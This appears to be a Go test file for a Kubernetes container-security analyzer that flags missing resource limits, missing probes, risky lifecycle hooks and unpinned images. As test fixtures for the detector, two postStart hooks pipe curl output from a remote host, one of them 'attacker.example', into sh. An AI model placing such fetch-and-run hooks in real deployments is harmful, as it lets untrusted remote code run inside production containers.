package containersec

import (
	"context"
	"testing"

	"github.com/0hardik1/kubesplaining/internal/models"
	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

// TestAnalyzerFiresAllFourRules drives the analyzer with a Deployment whose container
// is missing every limit / request, has no probes, declares a postStart exec hook with
// a non-trivial command, and references an :latest image with no digest pin. All four
// rules should fire.
func TestAnalyzerFiresAllFourRules(t *testing.T) {
	t.Parallel()

	snapshot := models.Snapshot{
		Resources: models.SnapshotResources{
			Deployments: []appsv1.Deployment{
				{
					ObjectMeta: metav1.ObjectMeta{Name: "risky", Namespace: "default"},
					Spec: appsv1.DeploymentSpec{
						Template: corev1.PodTemplateSpec{
							Spec: corev1.PodSpec{
								Containers: []corev1.Container{
									{
										Name:  "app",
										Image: "nginx:latest",
										// No Resources, no Probes, lifecycle exec with a real command.
										Lifecycle: &corev1.Lifecycle{
											PostStart: &corev1.LifecycleHandler{
												Exec: &corev1.ExecAction{
													Command: []string{"sh", "-c", "curl http://attacker.example/seed | sh"},
												},
											},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	findings, err := New().Analyze(context.Background(), snapshot)
	if err != nil {
		t.Fatalf("Analyze() error = %v", err)
	}

	assertRulePresent(t, findings, "KUBE-CONTAINER-LIMITS-001")
	assertRulePresent(t, findings, "KUBE-CONTAINER-PROBE-001")
	assertRulePresent(t, findings, "KUBE-CONTAINER-LIFECYCLE-001")
	assertRulePresent(t, findings, "KUBE-CONTAINER-IMAGE-001")
}

// TestAnalyzerIgnoresHardenedWorkload locks in the negative case: a fully-hardened
// container (digest-pinned image with IfNotPresent, both probes, full resources, no
// lifecycle hook) should emit zero findings from this module.
func TestAnalyzerIgnoresHardenedWorkload(t *testing.T) {
	t.Parallel()

	snapshot := models.Snapshot{
		Resources: models.SnapshotResources{
			Deployments: []appsv1.Deployment{
				{
					ObjectMeta: metav1.ObjectMeta{Name: "safe", Namespace: "default"},
					Spec: appsv1.DeploymentSpec{
						Template: corev1.PodTemplateSpec{
							Spec: corev1.PodSpec{
								Containers: []corev1.Container{
									{
										Name:            "app",
										Image:           "nginx@sha256:deadbeef",
										ImagePullPolicy: corev1.PullIfNotPresent,
										LivenessProbe:   &corev1.Probe{ProbeHandler: corev1.ProbeHandler{TCPSocket: &corev1.TCPSocketAction{}}},
										ReadinessProbe:  &corev1.Probe{ProbeHandler: corev1.ProbeHandler{TCPSocket: &corev1.TCPSocketAction{}}},
										Resources: corev1.ResourceRequirements{
											Limits: corev1.ResourceList{
												corev1.ResourceCPU:    resource.MustParse("500m"),
												corev1.ResourceMemory: resource.MustParse("256Mi"),
											},
											Requests: corev1.ResourceList{
												corev1.ResourceCPU:    resource.MustParse("100m"),
												corev1.ResourceMemory: resource.MustParse("128Mi"),
											},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	findings, err := New().Analyze(context.Background(), snapshot)
	if err != nil {
		t.Fatalf("Analyze() error = %v", err)
	}

	if len(findings) != 0 {
		t.Fatalf("expected no findings, got %v", findings)
	}
}

// TestLimitsRuleFiresOnPartialMissingFields verifies the rule fires when *any* of the
// four resource fields are missing, not just the all-empty case. Limits set but no
// requests should still surface.
func TestLimitsRuleFiresOnPartialMissingFields(t *testing.T) {
	t.Parallel()

	snapshot := singleContainerSnapshot("partial", "default", func(c *corev1.Container) {
		c.Resources = corev1.ResourceRequirements{
			Limits: corev1.ResourceList{
				corev1.ResourceCPU:    resource.MustParse("500m"),
				corev1.ResourceMemory: resource.MustParse("256Mi"),
			},
			// No Requests at all.
		}
	})

	findings, err := New().Analyze(context.Background(), snapshot)
	if err != nil {
		t.Fatalf("Analyze() error = %v", err)
	}
	assertRulePresent(t, findings, "KUBE-CONTAINER-LIMITS-001")
}

// TestProbeRuleSkippedWhenOneProbePresent verifies the rule fires only when *both*
// probes are missing. A container with only a readiness probe should not trip it.
func TestProbeRuleSkippedWhenOneProbePresent(t *testing.T) {
	t.Parallel()

	snapshot := singleContainerSnapshot("one-probe", "default", func(c *corev1.Container) {
		c.ReadinessProbe = &corev1.Probe{ProbeHandler: corev1.ProbeHandler{TCPSocket: &corev1.TCPSocketAction{}}}
	})

	findings, err := New().Analyze(context.Background(), snapshot)
	if err != nil {
		t.Fatalf("Analyze() error = %v", err)
	}
	assertRuleAbsent(t, findings, "KUBE-CONTAINER-PROBE-001")
}

// TestLifecycleRuleSkippedForBenignSleep verifies the rule's heuristic: a `preStop`
// hook running `sleep N` (a common Helm-chart graceful-shutdown pattern) should not
// fire, because the impact / persistence narrative does not apply to a fixed delay.
func TestLifecycleRuleSkippedForBenignSleep(t *testing.T) {
	t.Parallel()

	snapshot := singleContainerSnapshot("sleep-hook", "default", func(c *corev1.Container) {
		c.Lifecycle = &corev1.Lifecycle{
			PreStop: &corev1.LifecycleHandler{
				Exec: &corev1.ExecAction{Command: []string{"sleep", "10"}},
			},
		}
	})

	findings, err := New().Analyze(context.Background(), snapshot)
	if err != nil {
		t.Fatalf("Analyze() error = %v", err)
	}
	assertRuleAbsent(t, findings, "KUBE-CONTAINER-LIFECYCLE-001")
}

// TestLifecycleRuleFiresForPostStartCurl verifies a `postStart` hook that fetches and
// executes remote content (the standard runtime-mutation pattern) is flagged.
func TestLifecycleRuleFiresForPostStartCurl(t *testing.T) {
	t.Parallel()

	snapshot := singleContainerSnapshot("curl-hook", "default", func(c *corev1.Container) {
		c.Lifecycle = &corev1.Lifecycle{
			PostStart: &corev1.LifecycleHandler{
				Exec: &corev1.ExecAction{
					Command: []string{"sh", "-c", "curl https://example.com/setup.sh | sh"},
				},
			},
		}
	})

	findings, err := New().Analyze(context.Background(), snapshot)
	if err != nil {
		t.Fatalf("Analyze() error = %v", err)
	}
	assertRulePresent(t, findings, "KUBE-CONTAINER-LIFECYCLE-001")
}

// TestImageRuleSkippedForDigestPinned verifies the digest-pinning rule does not fire
// when the image is already digest-pinned, even when imagePullPolicy is Always (the
// pull policy is irrelevant once the digest is the authoritative identifier).
func TestImageRuleSkippedForDigestPinned(t *testing.T) {
	t.Parallel()

	snapshot := singleContainerSnapshot("digest-pinned", "default", func(c *corev1.Container) {
		c.Image = "nginx@sha256:deadbeef"
		c.ImagePullPolicy = corev1.PullAlways
	})

	findings, err := New().Analyze(context.Background(), snapshot)
	if err != nil {
		t.Fatalf("Analyze() error = %v", err)
	}
	assertRuleAbsent(t, findings, "KUBE-CONTAINER-IMAGE-001")
}

// TestImageRuleSkippedForImmutableTagWithIfNotPresent verifies the rule does not fire
// on an immutable-looking tag (e.g. :v1.2.3) with IfNotPresent, because the registry
// can no longer silently substitute the image between pod starts in that combination.
// (KUBE-IMAGE-LATEST-001 in podsec catches the underlying mutable-tag pattern when
// the tag *is* :latest, so the two rules stay non-overlapping.)
func TestImageRuleSkippedForImmutableTagWithIfNotPresent(t *testing.T) {
	t.Parallel()

	snapshot := singleContainerSnapshot("pinned-tag", "default", func(c *corev1.Container) {
		c.Image = "nginx:1.27.5"
		c.ImagePullPolicy = corev1.PullIfNotPresent
	})

	findings, err := New().Analyze(context.Background(), snapshot)
	if err != nil {
		t.Fatalf("Analyze() error = %v", err)
	}
	assertRuleAbsent(t, findings, "KUBE-CONTAINER-IMAGE-001")
}

// TestImageRuleFiresForLatestWithDefaultPolicy verifies the rule fires when an :latest
// image has no explicit pull policy: Kubernetes defaults to Always for :latest, so the
// next reschedule re-resolves the tag.
func TestImageRuleFiresForLatestWithDefaultPolicy(t *testing.T) {
	t.Parallel()

	snapshot := singleContainerSnapshot("latest-default", "default", func(c *corev1.Container) {
		c.Image = "nginx:latest"
		// Clear the helper's IfNotPresent so the analyzer infers the kubelet default
		// for :latest, which is Always.
		c.ImagePullPolicy = ""
	})

	findings, err := New().Analyze(context.Background(), snapshot)
	if err != nil {
		t.Fatalf("Analyze() error = %v", err)
	}
	assertRulePresent(t, findings, "KUBE-CONTAINER-IMAGE-001")
}

// TestControlledPodsAreSkipped verifies the analyzer defers to the owning workload for
// controller-managed pods (matches podsec's behavior so the same workload does not
// produce duplicate findings via both the Pod and the Deployment iteration).
func TestControlledPodsAreSkipped(t *testing.T) {
	t.Parallel()

	controller := true
	snapshot := models.Snapshot{
		Resources: models.SnapshotResources{
			Pods: []corev1.Pod{
				{
					ObjectMeta: metav1.ObjectMeta{
						Name:      "owned-pod",
						Namespace: "default",
						OwnerReferences: []metav1.OwnerReference{
							{Kind: "ReplicaSet", Name: "rs", Controller: &controller},
						},
					},
					Spec: corev1.PodSpec{
						Containers: []corev1.Container{
							{Name: "app", Image: "nginx:latest"},
						},
					},
				},
			},
		},
	}

	findings, err := New().Analyze(context.Background(), snapshot)
	if err != nil {
		t.Fatalf("Analyze() error = %v", err)
	}
	if len(findings) != 0 {
		t.Fatalf("expected no findings for controller-owned pod, got %v", findings)
	}
}

// singleContainerSnapshot builds a minimal Deployment whose single container starts
// fully hardened (digest-pinned image, IfNotPresent, both probes, full resources, no
// lifecycle hook). The mutate callback flips one field to exercise a specific rule.
func singleContainerSnapshot(name, namespace string, mutate func(*corev1.Container)) models.Snapshot {
	c := &corev1.Container{
		Name:            "app",
		Image:           "nginx@sha256:deadbeef",
		ImagePullPolicy: corev1.PullIfNotPresent,
		LivenessProbe:   &corev1.Probe{ProbeHandler: corev1.ProbeHandler{TCPSocket: &corev1.TCPSocketAction{}}},
		ReadinessProbe:  &corev1.Probe{ProbeHandler: corev1.ProbeHandler{TCPSocket: &corev1.TCPSocketAction{}}},
		Resources: corev1.ResourceRequirements{
			Limits: corev1.ResourceList{
				corev1.ResourceCPU:    resource.MustParse("500m"),
				corev1.ResourceMemory: resource.MustParse("256Mi"),
			},
			Requests: corev1.ResourceList{
				corev1.ResourceCPU:    resource.MustParse("100m"),
				corev1.ResourceMemory: resource.MustParse("128Mi"),
			},
		},
	}
	if mutate != nil {
		mutate(c)
	}

	return models.Snapshot{
		Resources: models.SnapshotResources{
			Deployments: []appsv1.Deployment{
				{
					ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: namespace},
					Spec: appsv1.DeploymentSpec{
						Template: corev1.PodTemplateSpec{
							Spec: corev1.PodSpec{
								Containers: []corev1.Container{*c},
							},
						},
					},
				},
			},
		},
	}
}

func assertRulePresent(t *testing.T, findings []models.Finding, ruleID string) {
	t.Helper()

	for _, f := range findings {
		if f.RuleID == ruleID {
			return
		}
	}
	t.Fatalf("expected rule %s to be present, findings=%v", ruleID, findings)
}

func assertRuleAbsent(t *testing.T, findings []models.Finding, ruleID string) {
	t.Helper()

	for _, f := range findings {
		if f.RuleID == ruleID {
			t.Fatalf("expected rule %s to be absent, but found %+v", ruleID, f)
		}
	}
}
